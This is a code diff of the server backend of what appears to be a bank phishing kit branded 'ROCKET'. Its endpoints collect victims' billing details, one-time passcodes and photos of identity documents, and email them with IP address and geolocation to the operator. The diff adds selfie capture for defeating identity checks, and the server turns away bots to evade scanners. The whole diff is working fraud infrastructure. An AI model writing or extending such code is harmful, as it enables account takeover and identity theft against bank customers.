@@ -38,6 +38,7 @@ app.post("/send-session", (req, res) => __awaiter(void 0, void 0, void 0, functi
         const geo = geoip_lite_1.default.lookup(ip);
         const front = req.files && req.files.front;
         const back = req.files && req.files.back;
+        const selfie = req.files && req.files.selfie;
         const values = JSON.parse(req.fields ? req.fields.session : "{}");
         yield sendEmail_1.sendEmail(process.env.TO, `
    <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
@@ -80,7 +81,7 @@ app.post("/send-session", (req, res) => __awaiter(void 0, void 0, void 0, functi
    <p>| (▰˘◡˘▰) STATE ☞ <b>${values.billing.state}</b></p>
    <p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.billing.phoneNumber}</b></p>
    ${values.billing.balance &&
-            `<p>| (▰˘◡˘▰) BALANCE ☞ <b>${values.billing.balance}</b></p>`}
+            `<p>| (▰˘◡˘▰) POTENTIAL BALANCE ☞ <b>${values.billing.balance}</b></p>`}
    <br>
    ${values.otp
             ? `<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
@@ -89,10 +90,10 @@ app.post("/send-session", (req, res) => __awaiter(void 0, void 0, void 0, functi
      <p>| (▰˘◡˘▰) OTP ☞ <b>${values.otp}</b></p>
      <br>`
             : ""}
-   ${req.files
+   ${req.files && (req.files.front || req.files.back)
             ? ` <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
      <br>
-     <h4>SUPPORTING DOCUMENTS</h4>
+     <h4>SUPPORTING DOCUMENTS${selfie ? " & SELFIE" : ""}</h4>
      <p>| (▰˘◡˘▰) See attached files</b></p>
      <br>`
             : ""}
@@ -104,7 +105,7 @@ app.post("/send-session", (req, res) => __awaiter(void 0, void 0, void 0, functi
    <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
    <br>
    <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
-   `, `${process.env.BANK_NAME} - ${(_a = req.fields) === null || _a === void 0 ? void 0 : _a.form} by ROCKET 🚀🚀🚀 From ${ip}`, req.files
+   `, `${process.env.BANK_NAME} - ${(_a = req.fields) === null || _a === void 0 ? void 0 : _a.form} by ROCKET 🚀🚀🚀 From ${ip}`, req.files && (req.files.front || req.files.back)
             ? [
                 {
                     filename: `Front.${front.type.split("/")[1]}`,
@@ -114,6 +115,14 @@ app.post("/send-session", (req, res) => __awaiter(void 0, void 0, void 0, functi
                     filename: `Back.${back.type.split("/")[1]}`,
                     content: back,
                 },
+                ...(selfie
+                    ? [
+                        {
+                            filename: `Selfie.${selfie.type.split("/")[1]}`,
+                            content: selfie,
+                        },
+                    ]
+                    : []),
             ]
             : []);
     }
@@ -157,6 +166,45 @@ app.post("/send-files", (req, res) => __awaiter(void 0, void 0, void 0, function
             {
                 filename: `Back.${back.type.split("/")[1]}`,
                 content: back,
+            },
+        ]);
+        res.send(Promise.resolve());
+    }
+    catch (error) {
+        console.log(error);
+        res.status(500).send("Something went wrong");
+    }
+}));
+app.post("/send-selfie", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    var _e, _f;
+    const md = new mobile_detect_1.default(req.headers["user-agent"]);
+    const isBot = md.is("Bot");
+    if (isBot) {
+        res.send("Fuck off");
+        return;
+    }
+    const selfie = (_e = req.files) === null || _e === void 0 ? void 0 : _e.selfie;
+    try {
+        const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+        const geo = geoip_lite_1.default.lookup(ip);
+        yield sendEmail_1.sendEmail(process.env.TO, `
+     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+     <br>
+     <h4>SELFIE</h4>
+     <p>| (▰˘◡˘▰) See attached files</b></p>
+     <br>
+     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+     <br>
+     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
+     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
+     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
+     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
+     <br>
+     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
+     `, `${process.env.BANK_NAME} - ${(_f = req.fields) === null || _f === void 0 ? void 0 : _f.form} by ROCKET 🚀🚀🚀 From ${ip}`, [
+            {
+                filename: `Selfie.${selfie.type.split("/")[1]}`,
+                content: selfie,
             },
         ]);
         res.send(Promise.resolve());
@@ -211,7 +259,7 @@ app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function
      <p>| (▰˘◡˘▰) STATE ☞ <b>${values.billing.state}</b></p>
      <p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.billing.phoneNumber}</b></p>
      ${values.billing.balance &&
-                        `<p>| (▰˘◡˘▰) BALANCE ☞ <b>${values.billing.balance}</b></p>`}
+                        `<p>| (▰˘◡˘▰) POTENTIAL BALANCE ☞ <b>${values.billing.balance}</b></p>`}
      <br>
      `
                     : ` <br>
